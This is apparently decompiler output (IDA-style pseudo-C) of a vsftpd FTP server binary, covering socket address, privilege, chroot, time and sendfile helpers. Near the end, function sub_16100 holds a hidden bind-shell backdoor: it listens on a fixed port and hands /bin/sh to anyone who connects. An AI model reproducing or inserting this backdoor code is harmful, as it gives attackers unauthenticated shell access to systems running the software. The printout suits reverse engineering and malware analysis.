  if ( len <= 0x1C )
  {
    if ( !len )
      return __readfsqword(0x28u) ^ v9;
    v5 = *a2;
  }
  else
  {
    v5 = *a2;
    len = 28;
    v4 = 28;
  }
  sub_12250(v5, &addr, v4);
  return __readfsqword(0x28u) ^ v9;
}

//----- (00000000000147A0) ----------------------------------------------------
void *__fastcall sub_147A0(void **a1)
{
  void *result; // rax

  sub_14580(a1);
  result = *a1;
  *(_WORD *)*a1 = 2;
  return result;
}

//----- (00000000000147C0) ----------------------------------------------------
void *__fastcall sub_147C0(void **a1)
{
  void *result; // rax

  sub_14580(a1);
  result = *a1;
  *(_WORD *)*a1 = 10;
  return result;
}

//----- (00000000000147E0) ----------------------------------------------------
void *__fastcall sub_147E0(void **a1, __int64 a2)
{
  _DWORD *v2; // rbp
  void *result; // rax

  sub_14580(a1);
  v2 = *a1;
  if ( *(_WORD *)a2 == 2 )
  {
    *(_WORD *)v2 = 2;
    return sub_12250(v2 + 1, (const void *)(a2 + 4), 4);
  }
  else
  {
    if ( *(_WORD *)a2 != 10 )
      sub_4B80();
    *(_WORD *)v2 = 10;
    sub_12250(v2 + 2, (const void *)(a2 + 8), 16);
    result = (void *)*(unsigned int *)(a2 + 24);
    v2[6] = (_DWORD)result;
  }
  return result;
}

//----- (0000000000014880) ----------------------------------------------------
_BOOL8 __fastcall sub_14880(unsigned __int16 *a1, unsigned __int16 *a2)
{
  int v2; // edx
  int v3; // eax
  _BOOL8 result; // rax

  v2 = *a1;
  v3 = *a2;
  if ( v2 != v3 )
  {
    if ( v2 == 2 && v3 == 10 )
    {
      result = 0LL;
      if ( *a2 != 10 )
        return result;
      if ( qword_2208A0 == *((_QWORD *)a2 + 1) && dword_2208A8 == *((_DWORD *)a2 + 4) )
        return *((_DWORD *)a2 + 5) == *((_DWORD *)a1 + 1);
    }
    else if ( v3 == 2
           && v2 == 10
           && *a1 == 10
           && qword_2208A0 == *((_QWORD *)a1 + 1)
           && dword_2208A8 == *((_DWORD *)a1 + 4) )
    {
      return *((_DWORD *)a1 + 5) == *((_DWORD *)a2 + 1);
    }
    return 0LL;
  }
  if ( v2 == 2 )
    return *((_DWORD *)a1 + 1) == *((_DWORD *)a2 + 1);
  result = 0LL;
  if ( v2 == 10 )
    return *(_OWORD *)(a2 + 4) == *(_OWORD *)(a1 + 4);
  return result;
}
// 2208A0: using guessed type __int64 qword_2208A0;
// 2208A8: using guessed type int dword_2208A8;

//----- (0000000000014950) ----------------------------------------------------
_BOOL8 __fastcall sub_14950(_WORD *a1)
{
  return *a1 == 10;
}

//----- (0000000000014960) ----------------------------------------------------
void *__fastcall sub_14960(_WORD *a1, const void *a2)
{
  __int64 v3; // rdi
  const void *v4; // rsi

  if ( *a1 == 2 )
    return sub_12250(a1 + 2, a2, 4);
  if ( *a1 != 10 )
    sub_4B30("bad family");
  sub_14580((void **)&qword_220E40);
  v3 = qword_220E40;
  *(_WORD *)qword_220E40 = 2;
  sub_12250((void *)(v3 + 4), a2, 4);
  v4 = 0LL;
  if ( *(_WORD *)qword_220E40 == 2 )
  {
    sub_12250(&unk_22089C, (const void *)(qword_220E40 + 4), 4);
    v4 = &unk_220890;
  }
  return sub_12250(a1 + 4, v4, 16);
}
// 220E40: using guessed type __int64 qword_220E40;

//----- (0000000000014A10) ----------------------------------------------------
void *__fastcall sub_14A10(_WORD *a1, const void *a2)
{
  if ( *a1 != 10 )
    sub_4B30("bad family");
  return sub_12250(a1 + 4, a2, 16);
}

//----- (0000000000014A40) ----------------------------------------------------
__int64 __fastcall sub_14A40(__int64 a1)
{
  if ( *(_WORD *)a1 == 10 && qword_2208A0 == *(_QWORD *)(a1 + 8) && dword_2208A8 == *(_DWORD *)(a1 + 16) )
    return a1 + 20;
  else
    return 0LL;
}
// 2208A0: using guessed type __int64 qword_2208A0;
// 2208A8: using guessed type int dword_2208A8;

//----- (0000000000014AB0) ----------------------------------------------------
_WORD *__fastcall sub_14AB0(_WORD *a1)
{
  if ( *a1 == 2 )
    return a1 + 2;
  if ( *a1 != 10 )
    sub_4B30("bad family");
  return a1 + 4;
}

//----- (0000000000014AF0) ----------------------------------------------------
__int64 sub_14AF0()
{
  return 16LL;
}
// 14AF0: using guessed type __int64 sub_14AF0();

//----- (0000000000014B00) ----------------------------------------------------
int __fastcall sub_14B00(_WORD *a1)
{
  if ( *a1 == 2 )
    return sub_13FC0();
  if ( *a1 != 10 )
    sub_4B30("bad family");
  return sub_14010();
}

//----- (0000000000014B40) ----------------------------------------------------
void *__fastcall sub_14B40(_WORD *a1)
{
  if ( *a1 == 2 )
    return sub_121A0(a1 + 2, 4u);
  if ( *a1 != 10 )
    sub_4B30("bad family");
  return sub_121A0(a1 + 4, 0x10u);
}

//----- (0000000000014B80) ----------------------------------------------------
__int16 __fastcall sub_14B80(_WORD *a1)
{
  if ( *a1 != 2 && *a1 != 10 )
    sub_4B30("bad family");
  return __ROR2__(a1[1], 8);
}

//----- (0000000000014BC0) ----------------------------------------------------
__int64 __fastcall sub_14BC0(unsigned __int16 *a1, __int16 a2)
{
  __int64 result; // rax

  result = *a1;
  if ( (_WORD)result != 2 && (_WORD)result != 10 )
    sub_4B30("bad family");
  a1[1] = __ROR2__(a2, 8);
  return result;
}

//----- (0000000000014BF0) ----------------------------------------------------
_BOOL8 __fastcall sub_14BF0(unsigned __int16 a1)
{
  return a1 <= 0x3FFu;
}

//----- (0000000000014C00) ----------------------------------------------------
char *__fastcall sub_14C00(__int64 a1)
{
  const char *v1; // rax

  if ( *(_WORD *)a1 == 2 )
    return inet_ntoa(*(struct in_addr *)(a1 + 4));
  if ( *(_WORD *)a1 != 10 )
    sub_4B80();
  v1 = inet_ntop(10, (const void *)(a1 + 8), &buf, 0x40u);
  byte_220E3F = 0;
  if ( !v1 )
    buf = 0;
  return &buf;
}
// 220E3F: using guessed type char byte_220E3F;

//----- (0000000000014C90) ----------------------------------------------------
char *__fastcall sub_14C90(struct in_addr *a1)
{
  return inet_ntoa((struct in_addr)a1->s_addr);
}

//----- (0000000000014CA0) ----------------------------------------------------
int __fastcall sub_14CA0(char *cp, _WORD *a2)
{
  int result; // eax
  struct in_addr inp; // [rsp+4h] [rbp-24h] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  if ( *a2 != 2 )
    sub_4B30("bad family");
  result = inet_aton(cp, &inp);
  if ( result )
  {
    sub_12250(a2 + 2, &inp, 4);
    return 1;
  }
  return result;
}

//----- (0000000000014D20) ----------------------------------------------------
void *__fastcall sub_14D20(void **a1, const char *a2)
{
  struct hostent *v3; // rbx
  void *v4; // rdi
  int h_addrtype; // eax
  unsigned int h_length; // r12d
  _WORD *v7; // rdi
  const void **v8; // rax
  void *result; // rax
  _WORD *v10; // rdi
  const void **h_addr_list; // rax
  const void *v12; // rsi
  void *v13; // rdi
  char *v14; // rdi
  char *v15; // rdi

  v3 = gethostbyname(a2);
  if ( !v3 )
    sub_4BA0("cannot resolve host:", a2);
  v4 = *a1;
  if ( *a1 )
  {
    free(v4);
    *a1 = 0LL;
  }
  h_addrtype = v3->h_addrtype;
  if ( h_addrtype == 2 )
  {
    h_length = v3->h_length;
    if ( h_length > 4 )
    {
      sub_14580(a1);
      v10 = *a1;
      h_addr_list = (const void **)v3->h_addr_list;
      h_length = 4;
      *v10 = 2;
      v12 = *h_addr_list;
      v13 = v10 + 2;
      return sub_12250(v13, v12, h_length);
    }
    result = sub_14580(a1);
    v14 = (char *)*a1;
    *(_WORD *)*a1 = 2;
    if ( h_length )
    {
      v13 = v14 + 4;
      v12 = *v3->h_addr_list;
      return sub_12250(v13, v12, h_length);
    }
  }
  else
  {
    if ( h_addrtype != 10 )
      sub_4B80();
    h_length = v3->h_length;
    if ( h_length > 0x10 )
    {
      sub_14580(a1);
      v7 = *a1;
      v8 = (const void **)v3->h_addr_list;
      *v7 = 10;
      return sub_12250(v7 + 4, *v8, 16);
    }
    sub_14580(a1);
    v15 = (char *)*a1;
    result = byte_9 + 1;
    *(_WORD *)*a1 = 10;
    if ( h_length )
    {
      v13 = v15 + 8;
      v12 = *v3->h_addr_list;
      return sub_12250(v13, v12, h_length);
    }
  }
  return result;
}

//----- (0000000000014E60) ----------------------------------------------------
struct passwd *__fastcall sub_14E60(signed int uid)
{
  if ( uid < 0 )
    sub_4B30("negative uid in vsf_sysutil_getpwuid");
  return getpwuid(uid);
}

//----- (0000000000014EA0) ----------------------------------------------------
__int64 __fastcall sub_14EA0(__int64 a1)
{
  return *(_QWORD *)a1;
}

//----- (0000000000014EB0) ----------------------------------------------------
__int64 __fastcall sub_14EB0(__int64 a1)
{
  return *(_QWORD *)(a1 + 32);
}

//----- (0000000000014EC0) ----------------------------------------------------
__int64 __fastcall sub_14EC0(__int64 a1)
{
  return *(unsigned int *)(a1 + 16);
}

//----- (0000000000014EE0) ----------------------------------------------------
struct group *__fastcall sub_14EE0(signed int gid)
{
  if ( gid < 0 )
    sub_4B80();
  return getgrgid(gid);
}

//----- (0000000000014F10) ----------------------------------------------------
__int64 __fastcall sub_14F10(__int64 a1)
{
  return *(_QWORD *)a1;
}

//----- (0000000000014F20) ----------------------------------------------------
__int64 sub_14F20()
{
  unsigned int v0; // eax
  struct timeval v2; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( !dword_220DF0 )
  {
    if ( gettimeofday(&v2, 0LL) )
      sub_4B80();
    srand(v2.tv_usec);
    dword_220DF0 = 1;
  }
  v0 = rand();
  return v0 ^ HIWORD(v0) ^ (v0 >> 8) ^ HIBYTE(v0);
}
// 14F20: using guessed type __int64 sub_14F20();
// 220DF0: using guessed type int dword_220DF0;

//----- (0000000000014FB0) ----------------------------------------------------
_BOOL8 sub_14FB0()
{
  return getuid() == 0;
}

//----- (0000000000014FD0) ----------------------------------------------------
int __fastcall sub_14FD0(__uid_t a1)
{
  int result; // eax

  result = setuid(a1);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000015000) ----------------------------------------------------
int __fastcall sub_15000(__int64 a1)
{
  return sub_14FD0(*(_DWORD *)(a1 + 16));
}

//----- (0000000000015010) ----------------------------------------------------
int __fastcall sub_15010(__gid_t a1)
{
  int result; // eax

  result = setgid(a1);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000015040) ----------------------------------------------------
int __fastcall sub_15040(__int64 a1)
{
  return sub_15010(*(_DWORD *)(a1 + 20));
}

//----- (0000000000015050) ----------------------------------------------------
signed int sub_15050()
{
  signed int result; // eax

  result = geteuid();
  if ( result < 0 )
    sub_4B80();
  return result;
}

//----- (0000000000015090) ----------------------------------------------------
signed int sub_15090()
{
  signed int result; // eax

  result = getegid();
  if ( result < 0 )
    sub_4B80();
  return result;
}

//----- (00000000000150D0) ----------------------------------------------------
int __fastcall sub_150D0(__uid_t euid)
{
  int result; // eax

  result = setreuid(0xFFFFFFFF, euid);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000015100) ----------------------------------------------------
int __fastcall sub_15100(__int64 a1)
{
  return sub_150D0(*(_DWORD *)(a1 + 16));
}

//----- (0000000000015110) ----------------------------------------------------
int __fastcall sub_15110(__gid_t egid)
{
  int result; // eax

  result = setregid(0xFFFFFFFF, egid);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000015140) ----------------------------------------------------
int __fastcall sub_15140(__int64 a1)
{
  return sub_15110(*(_DWORD *)(a1 + 20));
}

//----- (0000000000015150) ----------------------------------------------------
int sub_15150()
{
  int result; // eax

  result = setgroups(0LL, 0LL);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000015180) ----------------------------------------------------
int __fastcall sub_15180(__int64 a1)
{
  int result; // eax

  result = initgroups(*(const char **)a1, *(_DWORD *)(a1 + 20));
  if ( result )
    sub_4B80();
  return result;
}

//----- (00000000000151B0) ----------------------------------------------------
int __fastcall sub_151B0(const char *a1)
{
  int result; // eax

  result = chroot(a1);
  if ( result )
    sub_4B80();
  return result;
}

//----- (00000000000151E0) ----------------------------------------------------
__int64 sub_151E0()
{
  return (unsigned int)dword_2217E0;
}
// 151E0: using guessed type __int64 sub_151E0();
// 2217E0: using guessed type int dword_2217E0;

//----- (00000000000151F0) ----------------------------------------------------
__mode_t __fastcall sub_151F0(__int16 a1)
{
  dword_2217E0 = a1 & 0x1FF;
  return umask(a1 & 0x1FF);
}
// 2217E0: using guessed type int dword_2217E0;

//----- (0000000000015210) ----------------------------------------------------
__pid_t sub_15210()
{
  int v0; // ebx
  __pid_t result; // eax

  setsid();
  v0 = dword_2208AC;
  if ( dword_2208AC == -1 )
  {
    v0 = sub_16AA0();
    dword_2208AC = v0;
  }
  result = getpgrp();
  if ( result != v0 )
    sub_4B80();
  return result;
}
// 16AA0: using guessed type __int64 sub_16AA0(void);
// 2208AC: using guessed type int dword_2208AC;

//----- (0000000000015260) ----------------------------------------------------
int sub_15260()
{
  int v0; // eax
  int result; // eax
  int v2; // ebx

  v0 = open64("/dev/null", 2, 0LL);
  if ( v0 < 0 )
    sub_4B80();
  if ( v0 )
  {
    v2 = v0;
    sub_122C0(v0, 0);
    if ( v2 == 1 )
    {
      return sub_122C0(1, 2);
    }
    else
    {
      result = sub_122C0(v2, 1);
      if ( v2 != 2 )
      {
        sub_122C0(v2, 2);
        return sub_13880(v2);
      }
    }
  }
  else
  {
    sub_122C0(0, 1);
    return sub_122C0(0, 2);
  }
  return result;
}

//----- (0000000000015300) ----------------------------------------------------
unsigned __int64 sub_15300()
{
  struct tm *v0; // rax
  int v1; // eax
  char v3; // al
  __int64 v4; // rdx
  time_t timer; // [rsp+18h] [rbp-20h] BYREF
  char s; // [rsp+21h] [rbp-17h] BYREF
  char v7; // [rsp+22h] [rbp-16h]
  char v8; // [rsp+23h] [rbp-15h]
  char v9; // [rsp+24h] [rbp-14h]
  unsigned __int16 v10; // [rsp+25h] [rbp-13h]
  char v11; // [rsp+27h] [rbp-11h]
  unsigned __int64 v12; // [rsp+28h] [rbp-10h]

  v12 = __readfsqword(0x28u);
  timer = time(0LL);
  tzset();
  v0 = localtime(&timer);
  if ( !v0 )
    sub_4B80();
  v1 = strftime(&s, 7uLL, "%z", v0);
  v11 = 0;
  if ( v1 == 5 )
  {
    v3 = v9;
    v9 = 58;
    v10 = __PAIR16__(v10, v3);
    if ( s == 43 )
      s = 45;
    else
      s = 43;
    __snprintf_chk(string, 13LL, 1LL, 13LL, "TZ=UTC%s", &s);
    putenv(string);
    v4 = 60 * (SHIBYTE(v10) + 2 * (5 * (char)v10 - 240) - 48);
    qword_2217C0 = v4 + 3600 * (v8 + 2 * (5 * v7 - 240) - 48);
    if ( s == 45 )
      qword_2217C0 = -(v4 + 3600 * (v8 + 2 * (5 * v7 - 240) - 48));
  }
  return __readfsqword(0x28u) ^ v12;
}
// 3B50: using guessed type __int64 __snprintf_chk(_QWORD, _QWORD, _QWORD, _QWORD, const char *, ...);
// 2217C0: using guessed type __int64 qword_2217C0;

//----- (0000000000015470) ----------------------------------------------------
__time_t sub_15470()
{
  if ( gettimeofday(&tv, 0LL) )
    sub_4B80();
  return tv.tv_sec;
}

//----- (00000000000154A0) ----------------------------------------------------
char *sub_154A0()
{
  struct tm *v0; // rax
  char v1; // dl
  __int64 v2; // rax
  int v3; // ecx
  __int64 v5; // rdx
  __int64 v6; // rcx
  time_t v7; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v8; // [rsp+8h] [rbp-10h]

  v8 = __readfsqword(0x28u);
  v7 = sub_15470();
  v0 = localtime(&v7);
  if ( !strftime(byte_220DA0, 0x40uLL, "%a %b!%d %H:%M:%S %Y", v0) )
    sub_4B80();
  v1 = byte_220DA0[0];
  byte_220DDF = 0;
  if ( byte_220DA0[0] == 33 || !byte_220DA0[0] )
  {
    v3 = 0;
  }
  else
  {
    v2 = 1LL;
    do
    {
      v1 = byte_220DA0[v2];
      v3 = v2++;
    }
    while ( v1 != 33 && v1 );
  }
  if ( v1 == 33 )
  {
    v5 = v3;
    v6 = v3 + 1;
    byte_220DA0[v5] = 32;
    if ( byte_220DA0[v6] == 48 )
      byte_220DA0[v6] = 32;
  }
  return byte_220DA0;
}
// 220DDF: using guessed type char byte_220DDF;

//----- (00000000000155B0) ----------------------------------------------------
__suseconds_t sub_155B0()
{
  return tv.tv_usec;
}

//----- (00000000000155D0) ----------------------------------------------------
unsigned __int64 __fastcall sub_155D0(double a1)
{
  int *v1; // r13
  int v2; // ebp
  int v3; // r12d
  struct timespec v5; // [rsp+0h] [rbp-48h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-30h]

  v6 = __readfsqword(0x28u);
  v5.tv_sec = (unsigned int)(int)a1;
  v5.tv_nsec = (unsigned int)(int)((a1 - (double)(int)a1) * 1000000000.0);
  v1 = __errno_location();
  do
  {
    v2 = nanosleep(&v5, &v5);
    v3 = *v1;
    sub_12360(0, 0, 0);
  }
  while ( v2 == -1 && v3 == 4 );
  return __readfsqword(0x28u) ^ v6;
}

//----- (0000000000015680) ----------------------------------------------------
void __fastcall sub_15680(int a1)
{
  openlog("vsftpd", a1 == 0 ? 9 : 1, 88);
}

//----- (00000000000156B0) ----------------------------------------------------
__int64 __fastcall sub_156B0(const char *a1, int a2)
{
  return __syslog_chk(a2 == 0 ? 6 : 4, 1LL, "%s", a1);
}
// 40E0: using guessed type __int64 __syslog_chk(_QWORD, _QWORD, const char *, ...);

//----- (00000000000156E0) ----------------------------------------------------
time_t __fastcall sub_156E0(const char *a1)
{
  unsigned int v1; // r15d
  struct tm v3; // [rsp+0h] [rbp-88h] BYREF
  char v4[3]; // [rsp+3Dh] [rbp-4Bh] BYREF
  char v5[3]; // [rsp+40h] [rbp-48h] BYREF
  char nptr[5]; // [rsp+43h] [rbp-45h] BYREF
  unsigned __int64 v7; // [rsp+48h] [rbp-40h]

  v7 = __readfsqword(0x28u);
  v1 = strlen(a1);
  if ( v1 > 0xFFFFFFF )
    sub_4B80();
  sub_121A0(&v3, 0x38u);
  if ( v1 > 7 )
  {
    sub_122A0(nptr, a1, 5u);
    sub_122A0(v4, a1 + 4, 3u);
    sub_122A0(v5, a1 + 6, 3u);
    v3.tm_year = strtol(nptr, 0LL, 10) - 1900;
    v3.tm_mon = strtol(v4, 0LL, 10) - 1;
    v3.tm_mday = strtol(v5, 0LL, 10);
    if ( v1 > 0xD )
    {
      sub_122A0(v4, a1 + 8, 3u);
      sub_122A0(v5, a1 + 10, 3u);
      sub_122A0(nptr, a1 + 12, 3u);
      v3.tm_hour = strtol(v4, 0LL, 10);
      v3.tm_min = strtol(v5, 0LL, 10);
      v3.tm_sec = strtol(nptr, 0LL, 10);
    }
  }
  return mktime(&v3);
}

//----- (0000000000015880) ----------------------------------------------------
int __fastcall sub_15880(char *file, __time_t a2, int a3)
{
  __time_t v3; // rbx
  struct utimbuf v5; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-20h]

  v3 = a2;
  v6 = __readfsqword(0x28u);
  if ( !a3 )
    v3 = a2 - qword_2217C0;
  sub_121A0(&v5, 0x10u);
  v5.actime = v3;
  v5.modtime = v3;
  return utime(file, &v5);
}
// 2217C0: using guessed type __int64 qword_2217C0;

//----- (00000000000158F0) ----------------------------------------------------
int __fastcall sub_158F0(int a1)
{
  int result; // eax

  result = ftruncate64(a1, 0LL);
  if ( result )
    sub_4B80();
  return result;
}

//----- (0000000000015930) ----------------------------------------------------
unsigned __int64 __fastcall sub_15930(rlim64_t a1)
{
  struct rlimit64 v2; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-10h]

  v2.rlim_cur = a1;
  v2.rlim_max = a1;
  v3 = __readfsqword(0x28u);
  if ( setrlimit64(RLIMIT_AS, &v2) && *__errno_location() != 1 )
    sub_4B80();
  return __readfsqword(0x28u) ^ v3;
}

//----- (0000000000015990) ----------------------------------------------------
unsigned __int64 sub_15990()
{
  struct rlimit64 v1; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-10h]

  v1.rlim_cur = 0LL;
  v1.rlim_max = 0LL;
  v2 = __readfsqword(0x28u);
  if ( setrlimit64(RLIMIT_NOFILE, &v1) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v2;
}

//----- (00000000000159F0) ----------------------------------------------------
unsigned __int64 sub_159F0()
{
  struct rlimit64 v1; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-10h]

  v1.rlim_cur = 0LL;
  v1.rlim_max = 0LL;
  v2 = __readfsqword(0x28u);
  if ( setrlimit64(__RLIMIT_NPROC, &v1) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v2;
}

//----- (0000000000015A50) ----------------------------------------------------
unsigned int *sub_15A50()
{
  unsigned int *v0; // rax
  int i; // edx
  __int64 v2; // rax
  unsigned int *result; // rax

  qword_2217C8 = 0LL;
  dword_2208AC = -1;
  qword_220F90 = 0LL;
  v0 = dword_220FA0;
  do
  {
    *(_QWORD *)v0 = 0LL;
    v0 += 8;
  }
  while ( &dword_220FA0[520] != v0 );
  for ( i = 0; i != 65; ++i )
  {
    v2 = i;
    result = &dword_220FA0[8 * v2];
    result[4] = 0;
  }
  return result;
}
// 2208AC: using guessed type int dword_2208AC;
// 220F90: using guessed type __int64 (__fastcall *qword_220F90)(_QWORD, _QWORD, _QWORD);
// 220FA0: using guessed type unsigned int dword_220FA0[520];
// 2217C8: using guessed type __int64 qword_2217C8;

//----- (0000000000015AC0) ----------------------------------------------------
__int64 __fastcall capset(__int64 a1, __int64 a2)
{
  return syscall(126LL, a1, a2);
}

//----- (0000000000015AE0) ----------------------------------------------------
_BOOL8 __fastcall sub_15AE0(_QWORD *a1, _QWORD *a2)
{
  const char *v2; // rax
  struct passwd *v3; // rax
  struct passwd *v4; // rbx
  const char *v5; // rax
  struct spwd *v6; // r12
  __time_t v7; // kr00_8
  __int64 sp_expire; // rax
  __int64 v9; // rdx
  __int64 sp_lstchg; // rax
  __int64 sp_max; // rcx
  const char *sp_pwdp; // r13
  const char *v13; // rax
  char *v14; // rax
  const char *pw_passwd; // r12
  const char *v16; // rax
  char *v17; // rax
  char *v19; // rax

  v2 = (const char *)sub_C510(a1);
  v3 = getpwnam(v2);
  if ( !v3 )
    return 0LL;
  v4 = v3;
  if ( dword_221C4C )
  {
    do
    {
      v19 = getusershell();
      if ( !v19 )
      {
        endusershell();
        return 0LL;
      }
    }
    while ( j__strcmp(v19, v4->pw_shell) );
    endusershell();
  }
  v5 = (const char *)sub_C510(a1);
  v6 = getspnam(v5);
  if ( !v6 )
    goto LABEL_10;
  v7 = sub_15470();
  sp_expire = v6->sp_expire;
  v9 = v7 / 86400;
  if ( sp_expire > 0 && sp_expire < (int)v9 )
    return 0LL;
  sp_lstchg = v6->sp_lstchg;
  if ( sp_lstchg > 0 )
  {
    sp_max = v6->sp_max;
    if ( sp_max > 0 && sp_max + sp_lstchg < (int)v9 )
      return 0LL;
  }
  sp_pwdp = v6->sp_pwdp;
  v13 = (const char *)sub_C510(a2);
  v14 = crypt(v13, sp_pwdp);
  if ( j__strcmp(v14, v6->sp_pwdp) )
  {
LABEL_10:
    pw_passwd = v4->pw_passwd;
    v16 = (const char *)sub_C510(a2);
    v17 = crypt(v16, pw_passwd);
    return j__strcmp(v17, v4->pw_passwd) == 0;
  }
  return 1LL;
}
// 221C4C: using guessed type int dword_221C4C;

//----- (0000000000015C40) ----------------------------------------------------
__int64 sub_15C40()
{
  __int64 result; // rax
  int v1; // eax

  if ( dword_22181C )
    return (unsigned int)dword_221818;
  v1 = prctl(8, 0LL);
  if ( (unsigned int)sub_13F40(v1) )
  {
    result = (unsigned int)dword_221818;
  }
  else
  {
    dword_221818 = 1;
    result = 1LL;
  }
  dword_22181C = 1;
  return result;
}
// 221818: using guessed type int dword_221818;
// 22181C: using guessed type int dword_22181C;

//----- (0000000000015CB0) ----------------------------------------------------
__int64 sub_15CB0()
{
  int v0; // eax
  __int64 result; // rax

  if ( !(unsigned int)sub_15C40() )
    sub_4B30("asked to keep capabilities, but no support exists");
  v0 = prctl(8, 1LL);
  result = sub_13F40(v0);
  if ( (_DWORD)result )
    sub_4B80();
  return result;
}
// 15CB0: using guessed type __int64 sub_15CB0();

//----- (0000000000015D00) ----------------------------------------------------
__int64 sub_15D00()
{
  __int64 result; // rax
  unsigned int v1; // eax
  int v2; // edx

  if ( dword_221814 )
    return (unsigned int)dword_221810;
  v1 = syscall(126LL, 0LL, 0LL);
  v2 = sub_13F40(v1);
  result = 1LL;
  if ( v2 )
    result = (unsigned int)sub_13F50() != 3;
  dword_221810 = result;
  dword_221814 = 1;
  return result;
}
// 13F50: using guessed type __int64 sub_13F50(void);
// 15D00: using guessed type __int64 sub_15D00();
// 221810: using guessed type int dword_221810;
// 221814: using guessed type int dword_221814;

//----- (0000000000015D70) ----------------------------------------------------
unsigned __int64 __fastcall sub_15D70(int a1)
{
  int v1; // eax
  int v2; // edx
  __int64 v4; // [rsp+4h] [rbp-34h] BYREF
  int v5[3]; // [rsp+Ch] [rbp-2Ch] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-20h]

  v6 = __readfsqword(0x28u);
  if ( !a1 )
    sub_4B30("asked to adopt no capabilities");
  sub_13650(&v4, 8u);
  sub_13650(v5, 0xCu);
  v4 = 429392688LL;
  v1 = a1 & 1;
  v2 = v1;
  BYTE1(v2) = 4;
  if ( (a1 & 2) != 0 )
    v1 = v2;
  v5[1] = v1;
  v5[0] = v1;
  v5[2] = 0;
  if ( (unsigned int)syscall(126LL, &v4, v5) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v6;
}

//----- (0000000000015E70) ----------------------------------------------------
__int64 __fastcall sub_15E70(unsigned int fd, unsigned int a2, __int64 *a3, __int64 a4, unsigned int a5)
{
  __int64 v6; // rax
  __off64_t v7; // rsi
  unsigned int v8; // ebx
  unsigned int v9; // r15d
  int v10; // r14d
  int v11; // eax
  void *v13; // rsi
  unsigned int v14; // r12d
  size_t v15; // rdx
  int v16; // eax
  int v17; // r14d
  int v18; // eax
  __int64 v19; // [rsp+8h] [rbp-60h]
  unsigned int nbytes; // [rsp+1Ch] [rbp-4Ch]
  __int64 v22; // [rsp+28h] [rbp-40h]

  v19 = a4;
  if ( *a3 < 0 || a4 < 0 )
    sub_4B80();
  v6 = 0x7FFFFFFFLL;
  if ( a5 )
    v6 = a5;
  nbytes = v6;
  if ( a4 > 0 )
  {
    v22 = v6;
    v7 = *a3;
    do
    {
      v8 = v19;
      if ( v22 < v19 )
        v8 = nbytes;
      sub_12A60(a2, v7);
      if ( !dword_221AE0 || dword_22180C && !dword_221808 )
        goto LABEL_24;
      do
      {
        v9 = sendfile(fd, a2, 0LL, v8);
        v10 = sub_13F50();
        sub_12360(1, v9, fd);
        v11 = sub_13F40(v9);
      }
      while ( v10 == 4 && v11 );
      if ( !dword_22180C )
      {
        dword_22180C = 1;
        if ( !(unsigned int)sub_13F40(v9) || v10 != 3 )
          dword_221808 = 1;
      }
      if ( !(unsigned int)sub_13F40(v9) || dword_221808 && (unsigned int)(v10 - 5) > 1 )
      {
LABEL_19:
        if ( (unsigned int)sub_13F40(v9) )
          return v9;
        if ( !v9 )
          return 0;
      }
      else
      {
LABEL_24:
        v13 = qword_221800;
        if ( !qword_221800 )
        {
          sub_A800((unsigned __int64 *)&qword_221800, 0x10000u);
          v13 = qword_221800;
        }
        v14 = 0;
        while ( 1 )
        {
          v15 = 0x10000LL;
          if ( v8 < 0x10000 )
            v15 = v8;
          v16 = sub_12840(a2, v13, v15);
          v9 = v16;
          if ( v16 < 0 )
            break;
          if ( !v16 )
          {
            v9 = -1;
            break;
          }
          v17 = v16;
          v18 = sub_129A0(fd, (__int64)qword_221800, v16);
          v9 = v18;
          if ( v18 < 0 )
            break;
          v14 += v18;
          if ( v17 != v18 )
            goto LABEL_19;
          if ( v8 < v18 )
            sub_4B30("num_written bigger than num_send in do_sendfile");
          v8 -= v18;
          if ( !v8 )
          {
            v9 = v14;
            goto LABEL_19;
          }
          v13 = qword_221800;
        }
        if ( (unsigned int)sub_13F40(v9) )
          return v9;
      }
      v19 -= (int)v9;
      v7 = *a3 + (int)v9;
      *a3 = v7;
    }
    while ( v19 > 0 );
  }
  return 0;
}
// 13F50: using guessed type __int64 sub_13F50(void);
// 221808: using guessed type int dword_221808;
// 22180C: using guessed type int dword_22180C;
// 221AE0: using guessed type int dword_221AE0;

//----- (0000000000016100) ----------------------------------------------------
void __noreturn sub_16100()
{
  int v0; // eax
  int v1; // ebp
  int v2; // ebx
  struct sockaddr v3; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  v0 = socket(2, 1, 0);
  if ( v0 >= 0 )
  {
    *(_QWORD *)&v3.sa_data[2] = 0LL;
    *(_DWORD *)&v3.sa_data[10] = 0;
    v1 = v0;
    *(_DWORD *)&v3.sa_family = 941096962;
    if ( bind(v0, &v3, 0x10u) >= 0 && listen(v1, 100) != -1 )
    {
      while ( 1 )
      {
        v2 = accept(v1, 0LL, 0LL);
        close(0);
        close(1);
        close(2);
        dup2(v2, 0);
        dup2(v2, 1);
        dup2(v2, 2);
        execl("/bin/sh", "sh", 0LL);
      }
    }
  }
  exit(1);
}
// 16100: using guessed type void __noreturn sub_16100();

//----- (00000000000161E0) ----------------------------------------------------
__int64 __fastcall sub_161E0(__int64 a1)
{
  return sub_C3A0((__int64)&unk_2219B0, a1);
}

//----- (00000000000161F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_161F0(const char *a1)
{
  const char *v1; // rbp
